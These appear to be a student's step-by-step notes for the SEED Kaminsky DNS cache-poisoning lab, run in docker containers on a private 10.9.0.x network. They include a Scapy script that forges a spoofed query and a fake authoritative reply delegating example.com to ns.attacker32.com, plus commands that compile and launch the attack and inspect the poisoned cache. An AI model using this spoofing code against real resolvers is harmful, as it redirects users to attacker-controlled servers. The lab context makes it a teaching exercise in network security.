# Kaminsky Steps

## Testing dig tool

```
docker exec user-10.9.0.5 dig www.example.com
docker exec local-dns-server-10.9.0.53 /bin/sh -c "rndc flush"
```

## Finding IP addresses

```
dig SOA www.example.com 
dig @ns.icann.org www.example.com
dig b.iana-servers.net
dig a.iana-servers.net
```

## Code

```py
from scapy.all import * 
import random, string

attackerIP = "10.9.0.1"
apoloIP = "10.9.0.53"
nsIPs = ["199.43.133.53", "199.43.135.53"]

domain = 'example.com'
name = 'aaaaa.example.com'
ns = 'ns.attacker32.com'
port = RandShort()

# Send request
Qdsec = DNSQR(qname=name)
dns = DNS(id=0xAAAA, qr=0, qdcount=1, ancount=0, nscount=0,arcount=0, qd=Qdsec)
ip = IP(dst=apoloIP, src=attackerIP)
udp = UDP(dport=53, sport=33333, chksum=0)
request = ip/udp/dns

# Save the packet to a file
with open('ip_req.bin', 'wb') as f:
    f.write(bytes(request))

# answers
Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type='A', rdata="1.2.3.5", ttl=259200)
NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0,
    qd=Qdsec, an=Anssec, ns=NSsec)
ip = IP(dst=apoloIP, src=nsIPs[0])
udp = UDP(dport=33333, sport=53, chksum=0)
reply = ip/udp/dns
with open('ip_resp.bin', 'wb') as f:
    f.write(bytes(reply))
```

```sh
# Go to shared folder
cd Kaminsky/Labsetup/volumes

# Generate packets with scapy
python3 gen-packet.py 
ls -l *.bin

# Compile C code
gcc -o attack.o attack.c
ls -l *.o
```

## Launching the attack

```sh
# Apply filter to wireshark
Wireshark filter:  ip.dst==10.9.0.153

# Execute Kaminsky attack
docker exec -it seed-attacker bash
cd /volumes && ./attack.o
```

## Results
```sh
# Check DNS cache
docker exec local-dns-server-10.9.0.53 /bin/sh -c "rndc dumpdb -cache && grep attacker /var/cache/bind/dump.db"

# Check dig tool
docker exec user-10.9.0.5 dig www.example.com

cd ../../..
```